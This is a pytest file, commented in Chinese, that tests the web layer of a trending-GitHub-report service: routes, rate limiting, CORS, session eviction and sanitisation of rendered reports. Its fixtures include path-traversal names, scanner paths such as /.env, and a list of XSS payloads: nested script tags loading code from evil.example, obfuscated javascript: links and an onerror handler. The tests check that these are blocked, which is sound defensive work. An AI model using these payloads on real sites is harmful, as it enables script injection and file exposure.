"""网页端:HTTP 路由、会话池、安全中间件、报告渲染。

真起一个 app 打真实的 HTTP 请求(`TestClient` 不开端口,直接走 ASGI)。这一层出问题
不像业务逻辑那样有堆栈:404、CORS 配错、路径穿越放行,都是「看起来正常运行」的故障。
"""

import time
from datetime import date

import pytest
from fastapi.testclient import TestClient

from hot_project import api_server, config
from hot_project.web import render, security, sessions

REPORT = """# GitHub 热门项目 — 2026-07-30

> 共 1 个项目 | 增长统计窗口: 7 天

## 1. openai/whisper

链接: https://github.com/openai/whisper

- 创建时间: 2022-09-16
- 主语言: Python
- 总 Star: 82,000
- 近7天增长: +1,500

### 项目定位与用途

语音识别模型。
"""


@pytest.fixture
def report_dir(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "REPORT_DIR", tmp_path)
    (tmp_path / "2026-07-30.md").write_text(REPORT, encoding="utf-8")
    return tmp_path


@pytest.fixture
def client(monkeypatch):
    # 限速是全局状态,测试之间会互相污染 —— 每个用例一张干净的表
    monkeypatch.setattr(security, "_hits", {})
    return TestClient(api_server.app)


# ── 路由 ──────────────────────────────────────────────────────────

def test_the_service_reports_its_own_state(client):
    body = client.get("/api/status").json()
    assert body["status"] == "running"
    assert body["min_star"] == config.MIN_STAR


def test_the_chat_page_is_served(client):
    resp = client.get("/chat")
    assert resp.status_code == 200 and "<html" in resp.text.lower()


def test_pages_are_never_cached(client):
    """页面里注入了资源版本号。被缓存住的话,发版后用户拿到的是新 HTML 配旧 JS。"""
    assert "no-store" in client.get("/chat").headers["cache-control"]


def test_reports_are_listed_newest_first(client, report_dir):
    (report_dir / "2026-07-29.md").write_text(REPORT, encoding="utf-8")
    names = [r["name"] for r in client.get("/api/reports").json()["reports"]]
    assert names[0] == "2026-07-29.md" or names[0] == "2026-07-30.md"
    assert len(names) == 2


def test_the_listed_time_is_a_string_the_browser_parses_correctly(client, report_dir):
    """前端 `new Date(v)` 把裸数字当**毫秒**,给 st_mtime(秒)不会报错,只会把
    2026 年静悄悄显示成 1970-01-21 —— 页面照样打开,没人会去点开看那行小字。
    """
    item = client.get("/api/reports").json()["reports"][0]
    assert isinstance(item["modified_at"], str)
    assert item["modified_at"].startswith(str(date.today().year))


def test_a_report_renders_to_html(client, report_dir):
    resp = client.get("/api/reports/2026-07-30.md/html")
    assert resp.status_code == 200
    assert "openai/whisper" in resp.text
    assert "82,000" in resp.text


def test_a_report_can_be_fetched_as_markdown(client, report_dir):
    body = client.get("/api/reports/2026-07-30.md").json()
    assert body["content"].startswith("# GitHub 热门项目")


def test_an_unknown_report_is_a_404_not_a_500(client, report_dir):
    assert client.get("/api/reports/nope.md").status_code == 404


@pytest.mark.parametrize("evil", ["../config.py", "..%2f..%2fconfig.py", "a/b.md"])
def test_a_report_name_can_never_escape_the_directory(client, report_dir, evil):
    """名字直接来自 URL。放行一个就等于把整个文件系统开出去。"""
    assert client.get(f"/api/reports/{evil}").status_code in (404, 400)


def test_deleting_a_report_removes_the_file(client, report_dir):
    assert client.delete("/api/reports/2026-07-30.md").status_code == 200
    assert not (report_dir / "2026-07-30.md").exists()


def test_star_trend_rejects_a_malformed_repo_name(client):
    assert client.get("/api/star-trend", params={"repo": "not a repo"}).status_code == 400


def test_favorites_reject_a_malformed_user_id(client):
    assert client.get("/api/favorites", params={"user_id": "!!"}).status_code == 400


def test_the_preset_favorite_tags_are_served(client):
    assert client.get("/api/favorite-tags").json()["tags"] == list(config.FAVORITE_DEFAULT_TAGS)


def test_deleting_a_session_that_never_existed_is_a_404(client):
    assert client.delete("/api/sessions/nope").status_code == 404


# ── 安全 ──────────────────────────────────────────────────────────

@pytest.mark.parametrize("path", ["/.env", "/v1/chat/completions", "/admin", "/.git/config"])
def test_scanner_paths_get_404_not_403(client, path):
    """403 等于告诉对方「这里有东西」。404 什么都没说。"""
    assert client.get(path).status_code == 404


def test_too_many_requests_from_one_ip_are_throttled(client, monkeypatch):
    monkeypatch.setattr(security, "RATE_LIMIT", 3)
    monkeypatch.setattr(security, "_hits", {})
    codes = [client.get("/api/status").status_code for _ in range(5)]
    assert 429 in codes


def test_the_window_slides_so_a_slow_client_is_never_blocked(monkeypatch):
    monkeypatch.setattr(security, "RATE_LIMIT", 2)
    monkeypatch.setattr(security, "RATE_WINDOW", 0.05)
    monkeypatch.setattr(security, "_hits", {})
    assert not security.rate_limited("1.2.3.4")
    assert not security.rate_limited("1.2.3.4")
    assert security.rate_limited("1.2.3.4")
    time.sleep(0.06)
    assert not security.rate_limited("1.2.3.4")


def test_one_noisy_ip_does_not_throttle_everyone_else(monkeypatch):
    monkeypatch.setattr(security, "RATE_LIMIT", 1)
    monkeypatch.setattr(security, "_hits", {})
    assert not security.rate_limited("1.1.1.1")
    assert security.rate_limited("1.1.1.1")
    assert not security.rate_limited("2.2.2.2")


def test_the_real_ip_is_taken_from_the_proxy_header():
    class _Req:
        headers = {"x-forwarded-for": "203.0.113.9, 10.0.0.1"}
        client = None
    assert security.client_ip(_Req()) == "203.0.113.9"


def test_the_websocket_is_guarded_too_not_just_the_http_routes(client, monkeypatch):
    """安全中间件对 WebSocket **不生效** —— starlette 的 BaseHTTPMiddleware 见到非 http
    的 scope 就直接放行。于是 /ws/chat 曾是唯一没有黑名单、没有限速的入口,而它恰好是
    唯一真会驱动 agent 花钱的入口。36 个 HTTP 测试一条都抓不到这个,因为对 HTTP 它是好的。
    """
    monkeypatch.setattr(config, "SECURITY_IP_BLACKLIST", {"testclient"})
    with pytest.raises(Exception):          # 被 close(1008) 掉,连不上
        with client.websocket_connect("/ws/chat/s1"):
            pass


def test_a_rate_limited_client_cannot_open_a_websocket_either(client, monkeypatch):
    monkeypatch.setattr(security, "RATE_LIMIT", 0)
    monkeypatch.setattr(security, "_hits", {})
    with pytest.raises(Exception):
        with client.websocket_connect("/ws/chat/s1"):
            pass


def test_spoofed_forwarded_headers_do_not_grow_the_table_forever(monkeypatch):
    """`client_ip` 认 X-Forwarded-For,而那是客户端给的 —— 每换一个值就是一个新键。

    一个扫描器就能把这张表撑到几百万条。窗口空了就得删键:空 deque 不携带任何信息。
    """
    monkeypatch.setattr(security, "RATE_WINDOW", 0.01)
    monkeypatch.setattr(security, "_SWEEP_THRESHOLD", 4)
    monkeypatch.setattr(security, "_hits", {})
    for n in range(50):
        security.rate_limited(f"10.0.0.{n}")
    time.sleep(0.02)                        # 让所有窗口过期
    security.rate_limited("10.0.0.99")      # 这一次顺带触发清扫
    assert len(security._hits) < 10, f"表里还剩 {len(security._hits)} 条"


def test_wildcard_origins_and_credentials_cannot_both_be_on(monkeypatch):
    """浏览器会拒绝这个组合,但中间件不报错 —— 配错的人不会发现。"""
    monkeypatch.setattr(config, "CORS_ALLOWED_ORIGINS", ["*"])
    monkeypatch.setattr(config, "CORS_ALLOW_CREDENTIALS", True)
    assert security.cors_options()["allow_credentials"] is False


def test_a_named_origin_may_keep_credentials(monkeypatch):
    monkeypatch.setattr(config, "CORS_ALLOWED_ORIGINS", ["https://example.com"])
    monkeypatch.setattr(config, "CORS_ALLOW_CREDENTIALS", True)
    assert security.cors_options()["allow_credentials"] is True


# ── 会话池 ────────────────────────────────────────────────────────

@pytest.fixture(autouse=True)
def clean_sessions(monkeypatch):
    monkeypatch.setattr(sessions, "_agents", {})
    monkeypatch.setattr(sessions, "_pending", {})
    monkeypatch.setattr(sessions, "build", lambda: object())


def test_the_same_session_id_keeps_the_same_agent():
    assert sessions.get("a") is sessions.get("a")


def test_different_sessions_do_not_share_an_agent():
    assert sessions.get("a") is not sessions.get("b")


def test_an_expired_session_is_swept_away(monkeypatch):
    first = sessions.get("a")
    monkeypatch.setattr(sessions, "TTL_SECONDS", -1)
    assert sessions.get("a") is not first


def test_the_oldest_session_is_evicted_at_the_cap(monkeypatch):
    """没有上限的话,爬虫拿随机 session_id 打几万次就能把内存撑爆。"""
    monkeypatch.setattr(sessions, "MAX_SESSIONS", 3)
    for name in "abc":
        sessions.get(name)
        time.sleep(0.001)
    sessions.get("d")
    assert sessions.count() == 3
    assert "a" not in sessions._agents


def test_touching_a_session_keeps_it_from_being_the_eviction_victim(monkeypatch):
    monkeypatch.setattr(sessions, "MAX_SESSIONS", 2)
    sessions.get("a")
    time.sleep(0.001)
    sessions.get("b")
    time.sleep(0.001)
    sessions.get("a")           # a 被用了一下,现在 b 才是最旧的
    sessions.get("c")
    assert "a" in sessions._agents and "b" not in sessions._agents


def test_a_reply_stashed_while_offline_is_delivered_once():
    """手机切后台会断连,而 agent 还在跑。跑完发不出去就存着,重连补推。"""
    sessions.stash("a", "回复")
    assert sessions.take("a") == ["回复"]
    assert sessions.take("a") == []


def test_dropping_a_session_also_drops_its_stashed_replies():
    sessions.get("a")
    sessions.stash("a", "回复")
    sessions.drop("a")
    assert sessions.take("a") == []


# ── 渲染 ──────────────────────────────────────────────────────────

def test_a_javascript_url_in_a_report_is_defused(report_dir):
    html = render.report_html("x.md", "# 记\n\n[点我](javascript:alert(1))\n")
    assert "javascript:alert" not in html


def test_raw_script_tags_in_a_report_never_reach_the_page(report_dir):
    html = render.report_html("x.md", "# 记\n\n<script>alert(1)</script>\n")
    assert "<script>alert(1)</script>" not in html


# 报告不是全都出自我们之手:agent 的保存工具是聊天驱动的,提示词里让它写什么它就写什么。
# 下面每一条都实测穿过过旧版清洗,不是想象出来的向量。
@pytest.mark.parametrize("payload", [
    # 单次替换会被拼接绕过:删掉内层 <script> 后,<scr 和 ipt src=...> 重新拼成活标签
    "<scr<script>ipt src=http://evil.example/x.js>",
    "<scr<scr<script>ipt>ipt src=http://evil.example/x.js>",
    # 白名单只认带引号的属性值,裸写的直接穿过去
    "<a href=javascript:alert(1)>click</a>",
    "<img SRC=javascript:alert(1)>",
    # 这几条旧版就挡得住,一并钉住,以免修改清洗逻辑时遗漏它们
    '<a href="javascript:alert(1)">quoted</a>',
    "<a hREf=JaVaScRiPt:alert(1)>case</a>",
    '<a href=" java&#09;script:alert(1)">obfuscated</a>',
    "<img src=x onerror=alert(1)>",
])
def test_no_known_payload_survives_into_the_rendered_report(report_dir, payload):
    body = "\n".join(line for line in render.report_html("x.md", payload).splitlines()
                     if "/web/" not in line)      # 模板自己的 <script src="/web/..."> 不算
    lowered = body.lower()
    assert "evil.example" not in lowered
    assert "javascript:" not in lowered
    assert "onerror" not in lowered


def test_defusing_payloads_does_not_break_ordinary_links(report_dir):
    """清洗过头和清洗不足一样是 bug —— 报告里的项目链接是它唯一的用处。"""
    html = render.report_html("x.md", "[仓库](https://github.com/a/b)\n\n![图](/web/x.png)\n")
    assert 'href="https://github.com/a/b"' in html
    assert '/web/x.png' in html


def test_a_web_asset_name_cannot_escape_the_web_directory():
    with pytest.raises(OSError):
        render.asset_text("../config.py")
